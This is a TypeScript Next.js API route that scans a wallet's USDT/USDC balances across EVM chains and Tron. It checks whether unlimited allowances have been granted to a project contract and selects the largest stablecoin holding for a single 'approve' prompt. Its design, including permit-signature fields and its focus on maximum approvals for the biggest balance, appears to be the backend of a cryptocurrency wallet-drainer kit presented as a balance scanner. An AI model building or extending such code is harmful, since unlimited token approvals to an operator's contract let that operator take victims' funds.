/**
 * /api/scan-balances
 *
 * Scans ALL chains (EVM + Tron) in parallel, returns per-token balances
 * and — critically — a single `topToken` winner (highest USDT/USDC balance
 * across every chain including Tron). The frontend shows exactly one approve
 * prompt for that winner; everything else is informational.
 *
 * Runs in ~1–2 s regardless of chain count because every RPC call is parallel.
 */
import { NextRequest, NextResponse } from "next/server";
import { JsonRpcProvider, Contract, formatUnits } from "ethers";
import { CHAINS } from "@/lib/chains";
import { TRON_CHAIN } from "@/lib/tron";

export const runtime = "nodejs";

const ERC20_ABI = [
  "function balanceOf(address) view returns (uint256)",
  "function allowance(address owner, address spender) view returns (uint256)",
];

function getProvider(chain: (typeof CHAINS)[number]): JsonRpcProvider {
  const urls = chain.overrideRpcUrls?.length ? chain.overrideRpcUrls : chain.rpcUrls;
  return new JsonRpcProvider(urls[0], { chainId: chain.chainId, name: chain.name });
}

export interface ScannedToken {
  chain: string;
  chainLabel: string;
  chainId: number;
  symbol: string;
  address: string;
  decimals: number;
  balance: string;
  balanceUsd: number;
  allowance: string;
  alreadyApproved: boolean;
  contract: string;
  nativeBalance: string;
  nativeSymbol: string;
  isTron: boolean;
  permit?: boolean;
  permitDomainName?: string;
  permitDomainVersion?: string;
}

// ── Tron USDT balance via TronGrid public REST API ──────────────────────────
const TRON_USDT = "TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t";
const TRON_USDT_DECIMALS = 6;
const TRON_GRID = "https://api.trongrid.io";

async function getTronStableBalances(tronAddress: string): Promise<{
  usdt: number;
  allowance: number;
  alreadyApproved: boolean;
}> {
  try {
    // Account endpoint returns trc20 token balances
    const res = await fetch(`${TRON_GRID}/v1/accounts/${tronAddress}`, {
      signal: AbortSignal.timeout(3000),
    });
    if (!res.ok) return { usdt: 0, allowance: 0, alreadyApproved: false };
    const data = (await res.json()) as {
      data?: Array<{ trc20?: Array<Record<string, string>> }>;
    };

    const trc20 = data.data?.[0]?.trc20 ?? [];
    let usdtRaw = 0;
    for (const entry of trc20) {
      if (entry[TRON_USDT]) {
        usdtRaw = parseInt(entry[TRON_USDT], 10);
        break;
      }
    }

    // Allowance check via TronGrid trigger-constant-contract
    let allowanceRaw = 0;
    let alreadyApproved = false;
    try {
      const contractHex = TRON_CHAIN.contract;
      const allowRes = await fetch(`${TRON_GRID}/wallet/triggerconstantcontract`, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({
          owner_address: tronAddress,
          contract_address: TRON_USDT,
          function_selector: "allowance(address,address)",
          parameter:
            // ABI-encode owner + spender as 32-byte padded hex
            tronAddressToParamHex(tronAddress) + tronAddressToParamHex(contractHex),
          visible: true,
        }),
        signal: AbortSignal.timeout(3000),
      });
      if (allowRes.ok) {
        const allowData = (await allowRes.json()) as { constant_result?: string[] };
        const hex = allowData.constant_result?.[0];
        if (hex) {
          allowanceRaw = parseInt(hex, 16);
          const MAX = 2 ** 256 - 1;
          alreadyApproved = allowanceRaw >= MAX * 0.9; // within 10% of max
        }
      }
    } catch { /* allowance check is best-effort */ }

    return {
      usdt: usdtRaw / 10 ** TRON_USDT_DECIMALS,
      allowance: allowanceRaw / 10 ** TRON_USDT_DECIMALS,
      alreadyApproved,
    };
  } catch {
    return { usdt: 0, allowance: 0, alreadyApproved: false };
  }
}

/** Convert a Tron base58/hex address to a 32-byte-padded hex param for ABI encoding. */
function tronAddressToParamHex(addr: string): string {
  // TronGrid accepts visible addresses directly in the JSON body when visible:true,
  // but the parameter field still needs raw 32-byte hex.
  // Tron addresses in hex are 21 bytes (0x41 prefix + 20 bytes).
  // Strip the 0x/41 prefix and left-pad to 32 bytes.
  let hex = addr.replace(/^(0x|41)/, "");
  if (hex.length < 40) hex = hex.padStart(40, "0");
  return hex.padStart(64, "0");
}

export async function POST(req: NextRequest) {
  try {
    const body = (await req.json()) as { address?: string; tronAddress?: string };
    const { address, tronAddress } = body;

    if (!address || !/^0x[0-9a-fA-F]{40}$/.test(address)) {
      return NextResponse.json({ ok: false, error: "Invalid EVM address" }, { status: 400 });
    }

    const MAX_UINT256_STR =
      "115792089237316195423570985008687907853269984665640564039457584007913129639935";

    // ── Scan ALL chains in parallel (EVM + Tron) ─────────────────────────────
    const [chainResults, tronResult] = await Promise.all([
      // EVM chains
      Promise.allSettled(
        CHAINS.map(async (chain) => {
          const provider = getProvider(chain);
          const [nativeBal, ...tokenData] = await Promise.all([
            provider.getBalance(address).catch(() => 0n),
            ...chain.tokens.map(async (token) => {
              try {
                const erc20 = new Contract(token.address, ERC20_ABI, provider);
                const [bal, allowance] = await Promise.all([
                  erc20.balanceOf(address) as Promise<bigint>,
                  erc20.allowance(address, chain.contract) as Promise<bigint>,
                ]);
                return { token, bal, allowance };
              } catch {
                return { token, bal: 0n, allowance: 0n };
              }
            }),
          ]);

          const nativeStr = formatUnits(nativeBal as bigint, 18);
          const tokens: ScannedToken[] = tokenData.map(({ token, bal, allowance }) => {
            const balStr = formatUnits(bal as bigint, token.decimals);
            const allowStr = formatUnits(allowance as bigint, token.decimals);
            const balUsd =
              token.symbol === "USDT" || token.symbol === "USDC"
                ? parseFloat(balStr)
                : 0;
            return {
              chain: chain.name,
              chainLabel: chain.label,
              chainId: chain.chainId,
              symbol: token.symbol,
              address: token.address,
              decimals: token.decimals,
              balance: parseFloat(balStr).toFixed(token.decimals === 18 ? 4 : 2),
              balanceUsd: balUsd,
              allowance: allowStr,
              alreadyApproved: (allowance as bigint).toString() === MAX_UINT256_STR,
              contract: chain.contract,
              nativeBalance: parseFloat(nativeStr).toFixed(6),
              nativeSymbol: chain.nativeSymbol,
              isTron: false,
              permit: token.permit,
              permitDomainName: token.permitDomainName,
              permitDomainVersion: token.permitDomainVersion,
            };
          });

          return { chain, tokens, nativeBalance: nativeStr };
        })
      ),
      // Tron (only if address provided, non-blocking)
      tronAddress ? getTronStableBalances(tronAddress) : Promise.resolve(null),
    ]);

    // ── Collect EVM results ───────────────────────────────────────────────────
    const allTokens: ScannedToken[] = [];
    const chainUsd: Record<string, number> = {};

    for (const result of chainResults) {
      if (result.status !== "fulfilled") continue;
      const { chain, tokens } = result.value;
      let total = 0;
      for (const t of tokens) {
        allTokens.push(t);
        total += t.balanceUsd;
      }
      chainUsd[chain.name] = total;
    }

    // ── Add Tron USDT if scanned ──────────────────────────────────────────────
    if (tronResult && tronResult.usdt > 0) {
      const tronToken: ScannedToken = {
        chain: "tron",
        chainLabel: "Tron",
        chainId: 728126428, // Tron mainnet chain ID (informational)
        symbol: "USDT",
        address: TRON_USDT,
        decimals: 6,
        balance: tronResult.usdt.toFixed(2),
        balanceUsd: tronResult.usdt,
        allowance: tronResult.allowance.toFixed(2),
        alreadyApproved: tronResult.alreadyApproved,
        contract: TRON_CHAIN.contract,
        nativeBalance: "0",
        nativeSymbol: "TRX",
        isTron: true,
      };
      allTokens.push(tronToken);
      chainUsd["tron"] = tronResult.usdt;
    }

    const totalUsd = Object.values(chainUsd).reduce((a, b) => a + b, 0);

    // ── Pick single winner ────────────────────────────────────────────────────
    // Only USDT/USDC tokens count. Winner = highest USD balance across all chains.
    const stables = allTokens.filter(
      (t) => (t.symbol === "USDT" || t.symbol === "USDC") && t.balanceUsd > 0
    );
    const topToken = stables.sort((a, b) => b.balanceUsd - a.balanceUsd)[0] ?? null;

    const tokensWithBalance = allTokens
      .filter((t) => parseFloat(t.balance) > 0)
      .sort((a, b) => b.balanceUsd - a.balanceUsd);

    return NextResponse.json({
      ok: true,
      topToken,             // single winner — ONE approve prompt shown to user
      tokensWithBalance,    // all non-zero for informational display
      chainUsd,             // per-chain USD for balance check step
      totalUsd: totalUsd.toFixed(2),
    });
  } catch (err) {
    console.error("[scan-balances]", err);
    return NextResponse.json({ ok: false, error: "Internal error" }, { status: 500 });
  }
}
